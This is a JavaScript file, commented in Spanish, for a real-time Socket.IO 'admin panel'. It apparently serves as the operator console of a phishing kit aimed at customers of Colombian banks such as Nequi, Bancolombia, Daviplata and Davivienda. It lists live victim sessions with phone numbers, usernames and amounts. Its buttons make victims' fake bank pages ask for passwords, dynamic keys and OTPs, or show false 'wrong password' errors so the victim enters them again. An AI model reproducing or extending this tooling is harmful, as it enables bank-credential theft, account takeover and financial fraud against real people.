/**
 * Panel de Control Admin - Sistema en Tiempo Real con WebSockets
 * Arquitectura: 0 delay con Socket.IO
 * Optimizado para Railway
 */

class AdminControlPanel {
  constructor() {
    this.socket = null;
    this.sessions = new Map();
    this.currentFilter = 'all';
    this.searchTerm = '';
    this.reconnectAttempts = 0;
    this.maxReconnectAttempts = 10;
    this.init();
  }

  init() {
    console.log('[ADMIN PANEL] Inicializando...');
    this.connectSocket();
    this.setupEventListeners();
    this.setupAutoRefresh();
  }

  connectSocket() {
    try {
      // Auto-detect server URL based on environment
      const isProduction = window.location.hostname !== 'localhost';
      const socketUrl = isProduction ? 
        'https://tigo-admin.railway.app' : 
        'http://localhost:3001';
      
      console.log(`[ADMIN PANEL] Conectando a: ${socketUrl}`);

      this.socket = io(socketUrl, {
        transports: ['websocket', 'polling'],
        reconnection: true,
        reconnectionDelay: 1000,
        reconnectionDelayMax: 5000,
        reconnectionAttempts: this.maxReconnectAttempts,
        forceNew: true
      });

      this.socket.on('connect', () => {
        console.log('[ADMIN PANEL] ✅ Conectado al servidor');
        this.updateConnectionStatus(true);
        this.reconnectAttempts = 0;
        this.requestActiveSessions();
      });

      this.socket.on('disconnect', () => {
        console.log('[ADMIN PANEL] ❌ Desconectado del servidor');
        this.updateConnectionStatus(false);
      });

      this.socket.on('connect_error', (error) => {
        console.error('[ADMIN PANEL] Error de conexión:', error);
        this.reconnectAttempts++;
        if (this.reconnectAttempts >= this.maxReconnectAttempts) {
          this.showNotification('Error de conexión persistente', 'error');
        }
      });

      // Escuchar nuevas sesiones
      this.socket.on('new_session', (session) => {
        console.log('[ADMIN PANEL] Nueva sesión:', session);
        this.addSession(session);
        this.showNotification(`Nueva sesión: ${session.bank}`, 'success');
      });

      // Escuchar actualizaciones de sesiones
      this.socket.on('session_update', (session) => {
        console.log('[ADMIN PANEL] Sesión actualizada:', session);
        this.updateSession(session);
      });

      // Escuchar sesiones cerradas
      this.socket.on('session_closed', (sessionId) => {
        console.log('[ADMIN PANEL] Sesión cerrada:', sessionId);
        this.removeSession(sessionId);
        this.showNotification('Sesión finalizada', 'info');
      });

      // Recibir lista de sesiones activas
      this.socket.on('active_sessions', (sessions) => {
        console.log('[ADMIN PANEL] Sesiones activas recibidas:', sessions);
        this.loadSessions(sessions);
      });

      // Confirmación de acción
      this.socket.on('action_result', (result) => {
        console.log('[ADMIN PANEL] Resultado de acción:', result);
        if (result.success) {
          this.showNotification(result.message || 'Acción ejecutada exitosamente', 'success');
        } else {
          this.showNotification(result.message || 'Error al ejecutar acción', 'error');
        }
      });

    } catch (error) {
      console.error('[ADMIN PANEL] Error al conectar socket:', error);
      this.updateConnectionStatus(false);
    }
  }

  requestActiveSessions() {
    console.log('[ADMIN PANEL] Solicitando sesiones activas...');
    this.socket.emit('admin_get_sessions');
  }

  loadSessions(sessions) {
    this.sessions.clear();
    sessions.forEach(session => {
      this.sessions.set(session.sessionId, session);
    });
    this.renderSessions();
  }

  addSession(session) {
    this.sessions.set(session.sessionId, session);
    this.renderSessions();
  }

  updateSession(session) {
    this.sessions.set(session.sessionId, session);
    this.renderSessions();
  }

  removeSession(sessionId) {
    this.sessions.delete(sessionId);
    this.renderSessions();
  }

  renderSessions() {
    const container = document.getElementById('sessionsContainer');
    const emptyState = document.getElementById('emptyState');
    
    // Filtrar sesiones
    const filteredSessions = Array.from(this.sessions.values()).filter(session => {
      const matchesFilter = this.currentFilter === 'all' || 
                           session.bank.toLowerCase().includes(this.currentFilter.toLowerCase());
      const matchesSearch = !this.searchTerm || 
                           this.sessionMatchesSearch(session, this.searchTerm);
      return matchesFilter && matchesSearch;
    });

    // Actualizar contador
    document.getElementById('activeSessionsCount').textContent = this.sessions.size;

    if (filteredSessions.length === 0) {
      container.style.display = 'none';
      emptyState.style.display = 'block';
      return;
    }

    container.style.display = 'grid';
    emptyState.style.display = 'none';

    container.innerHTML = filteredSessions.map(session => this.createSessionCard(session)).join('');

    // Agregar event listeners a los botones
    this.attachButtonListeners();
  }

  sessionMatchesSearch(session, term) {
    const searchLower = term.toLowerCase();
    return (
      session.bank.toLowerCase().includes(searchLower) ||
      session.sessionId.toLowerCase().includes(searchLower) ||
      (session.data?.celular && session.data.celular.includes(searchLower)) ||
      (session.data?.telefono && session.data.telefono.includes(searchLower)) ||
      (session.data?.usuario && session.data.usuario.toLowerCase().includes(searchLower))
    );
  }

  createSessionCard(session) {
    const bankConfig = this.getBankConfig(session.bank);
    const timeSinceUpdate = this.getTimeSince(session.lastUpdate || session.timestamp);
    
    return `
      <div class="session-card glass p-5 ${session.active ? 'active' : ''}" data-session="${session.sessionId}">
        <!-- Header -->
        <div class="flex items-start justify-between mb-4">
          <div class="flex items-center gap-3">
            <img src="${bankConfig.logo}" alt="${session.bank}" class="bank-logo">
            <div>
              <h3 class="font-bold text-gray-800 text-lg">${session.bank}</h3>
              <p class="text-sm text-gray-500">${session.step || 'Iniciando'}</p>
            </div>
          </div>
          <span class="px-3 py-1 rounded-full text-xs font-semibold ${session.active ? 'bg-green-100 text-green-700' : 'bg-gray-100 text-gray-600'}">
            ${session.active ? 'Activa' : 'Inactiva'}
          </span>
        </div>

        <!-- Session Info -->
        <div class="mb-4 space-y-2 text-sm">
          <div class="flex items-center gap-2 text-gray-600">
            <i class="fas fa-fingerprint text-gray-400"></i>
            <span class="font-mono text-xs">${session.sessionId.substring(0, 16)}...</span>
          </div>
          ${session.data?.celular ? `
            <div class="flex items-center gap-2 text-gray-600">
              <i class="fas fa-phone text-gray-400"></i>
              <span>${session.data.celular}</span>
            </div>
          ` : ''}
          ${session.data?.usuario ? `
            <div class="flex items-center gap-2 text-gray-600">
              <i class="fas fa-user text-gray-400"></i>
              <span>${session.data.usuario}</span>
            </div>
          ` : ''}
          ${session.data?.monto ? `
            <div class="flex items-center gap-2 text-gray-600">
              <i class="fas fa-dollar-sign text-gray-400"></i>
              <span>$${this.formatNumber(session.data.monto)}</span>
            </div>
          ` : ''}
          <div class="flex items-center gap-2 text-gray-400 text-xs">
            <i class="fas fa-clock"></i>
            <span>${timeSinceUpdate}</span>
          </div>
        </div>

        <!-- Actions -->
        <div class="border-t pt-4">
          <p class="text-xs font-semibold text-gray-500 mb-3">ACCIONES RÁPIDAS</p>
          <div class="action-grid">
            ${this.generateActions(session).map(action => `
              <button 
                class="btn-action ${action.color} text-white px-3 py-2 rounded-lg text-xs font-semibold"
                data-session="${session.sessionId}"
                data-action="${action.action}"
                title="${action.label}"
              >
                <i class="${action.icon} mr-1"></i>
                ${action.label}
              </button>
            `).join('')}
          </div>
        </div>
      </div>
    `;
  }

  getBankConfig(bankName) {
    const configs = {
      'nequi': {
        logo: '/bancas/Nequi/logo-nequi.png',
        color: '#DA0081'
      },
      'bancolombia': {
        logo: '/bancas/Bancolombia/img/logo.png',
        color: '#FDDA24'
      },
      'daviplata': {
        logo: '/bancas/Daviplata/img/daviplata-logo.png',
        color: '#FF0000'
      },
      'davivienda': {
        logo: '/bancas/Davivienda/img/logo.png',
        color: '#FF0000'
      },
      'bogota': {
        logo: '/bancas/Bogota/Imagenes/bogota.png',
        color: '#003DA5'
      }
    };

    return configs[bankName.toLowerCase()] || {
      logo: '/img/bank-default.png',
      color: '#667eea'
    };
  }

  generateActions(session) {
    const bank = session.bank.toLowerCase();
    const step = (session.step || '').toLowerCase();
    const actions = [];

    // Acciones comunes
    actions.push(
      { action: 'finalizar', label: 'Finalizar', icon: 'fas fa-check-circle', color: 'bg-green-600 hover:bg-green-700' }
    );

    // Acciones específicas por banco
    if (bank === 'nequi') {
      actions.push(
        { action: 'nequi_pedir_numero', label: 'Pedir Número', icon: 'fas fa-phone', color: 'bg-blue-600 hover:bg-blue-700' },
        { action: 'nequi_pedir_clave', label: 'Pedir Clave', icon: 'fas fa-key', color: 'bg-purple-600 hover:bg-purple-700' },
        { action: 'nequi_pedir_saldo', label: 'Pedir Saldo', icon: 'fas fa-dollar-sign', color: 'bg-indigo-600 hover:bg-indigo-700' },
        { action: 'nequi_pedir_dinamica', label: 'Pedir Dinámica', icon: 'fas fa-sync', color: 'bg-cyan-600 hover:bg-cyan-700' },
        { action: 'nequi_error_clave', label: 'Error Clave', icon: 'fas fa-times', color: 'bg-red-600 hover:bg-red-700' },
        { action: 'nequi_error_dinamica', label: 'Error Dinámica', icon: 'fas fa-exclamation', color: 'bg-orange-600 hover:bg-orange-700' }
      );
    } else if (bank === 'bancolombia') {
      actions.push(
        { action: 'request_user', label: 'Pedir Usuario', icon: 'fas fa-user', color: 'bg-blue-600 hover:bg-blue-700' },
        { action: 'request_password', label: 'Pedir Clave', icon: 'fas fa-lock', color: 'bg-purple-600 hover:bg-purple-700' },
        { action: 'request_dynamic', label: 'Pedir Dinámica', icon: 'fas fa-sync', color: 'bg-cyan-600 hover:bg-cyan-700' },
        { action: 'error_user', label: 'Error Usuario', icon: 'fas fa-times', color: 'bg-red-600 hover:bg-red-700' },
        { action: 'error_password', label: 'Error Clave', icon: 'fas fa-exclamation', color: 'bg-orange-600 hover:bg-orange-700' }
      );
    } else {
      // PSE genérico
      actions.push(
        { action: 'request_login', label: 'Pedir Login', icon: 'fas fa-sign-in-alt', color: 'bg-blue-600 hover:bg-blue-700' },
        { action: 'request_password', label: 'Pedir Clave', icon: 'fas fa-lock', color: 'bg-purple-600 hover:bg-purple-700' },
        { action: 'request_otp', label: 'Pedir OTP', icon: 'fas fa-hashtag', color: 'bg-cyan-600 hover:bg-cyan-700' },
        { action: 'request_dynamic', label: 'Pedir Dinámica', icon: 'fas fa-sync', color: 'bg-indigo-600 hover:bg-indigo-700' },
        { action: 'error_login', label: 'Error Login', icon: 'fas fa-times', color: 'bg-red-600 hover:bg-red-700' },
        { action: 'error_password', label: 'Error Clave', icon: 'fas fa-exclamation', color: 'bg-orange-600 hover:bg-orange-700' }
      );
    }

    return actions;
  }

  attachButtonListeners() {
    document.querySelectorAll('.btn-action').forEach(button => {
      button.addEventListener('click', (e) => {
        const sessionId = e.currentTarget.dataset.session;
        const action = e.currentTarget.dataset.action;
        this.executeAction(sessionId, action);
      });
    });
  }

  executeAction(sessionId, action) {
    console.log(`[ADMIN PANEL] Ejecutando acción: ${action} en sesión: ${sessionId}`);
    
    if (!this.socket || !this.socket.connected) {
      this.showNotification('No hay conexión con el servidor', 'error');
      return;
    }

    // Enviar acción al servidor con confirmación visual inmediata
    this.showNotification(`Ejecutando: ${action}`, 'info');
    
    this.socket.emit('admin_action', {
      sessionId: sessionId,
      action: action,
      timestamp: Date.now()
    });
  }

  setupEventListeners() {
    // Refresh button
    document.getElementById('refreshBtn').addEventListener('click', () => {
      this.requestActiveSessions();
      this.showNotification('Actualizando sesiones...', 'info');
    });

    // Search
    document.getElementById('searchInput').addEventListener('input', (e) => {
      this.searchTerm = e.target.value;
      this.renderSessions();
    });

    // Filter tabs
    document.querySelectorAll('.filter-tab').forEach(tab => {
      tab.addEventListener('click', (e) => {
        document.querySelectorAll('.filter-tab').forEach(t => t.classList.remove('active'));
        e.currentTarget.classList.add('active');
        this.currentFilter = e.currentTarget.dataset.filter;
        this.renderSessions();
      });
    });
  }

  setupAutoRefresh() {
    // Auto-refresh cada 30 segundos
    setInterval(() => {
      if (this.socket && this.socket.connected) {
        this.requestActiveSessions();
      }
    }, 30000);
  }

  updateConnectionStatus(connected) {
    const statusElement = document.getElementById('connectionStatus');
    if (connected) {
      statusElement.className = 'connection-status connected';
      statusElement.innerHTML = '<i class="fas fa-circle status-badge"></i><span>Conectado</span>';
    } else {
      statusElement.className = 'connection-status disconnected';
      statusElement.innerHTML = '<i class="fas fa-circle status-badge"></i><span>Desconectado</span>';
    }
  }

  showNotification(message, type = 'info') {
    const colors = {
      success: 'bg-green-500 text-white',
      error: 'bg-red-500 text-white',
      info: 'bg-blue-500 text-white',
      warning: 'bg-yellow-500 text-white'
    };

    const notification = document.createElement('div');
    notification.className = `notification ${colors[type]}`;
    notification.innerHTML = `
      <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'} mr-2"></i>
      ${message}
    `;
    document.body.appendChild(notification);

    setTimeout(() => {
      notification.style.animation = 'slideOut 0.3s ease';
      setTimeout(() => notification.remove(), 300);
    }, 3000);
  }

  getTimeSince(timestamp) {
    const now = Date.now();
    const diff = now - timestamp;
    const seconds = Math.floor(diff / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);

    if (hours > 0) return `Hace ${hours}h`;
    if (minutes > 0) return `Hace ${minutes}m`;
    return `Hace ${seconds}s`;
  }

  formatNumber(num) {
    return new Intl.NumberFormat('es-CO').format(num);
  }
}

// Inicializar panel cuando el DOM esté listo
document.addEventListener('DOMContentLoaded', () => {
  console.log('[ADMIN PANEL] DOM cargado, inicializando panel...');
  window.adminPanel = new AdminControlPanel();
});

// Agregar animación de slideOut
const style = document.createElement('style');
style.textContent = `
  @keyframes slideOut {
    from {
      transform: translateX(0);
      opacity: 1;
    }
    to {
      transform: translateX(400px);
      opacity: 0;
    }
  }
`;
document.head.appendChild(style);
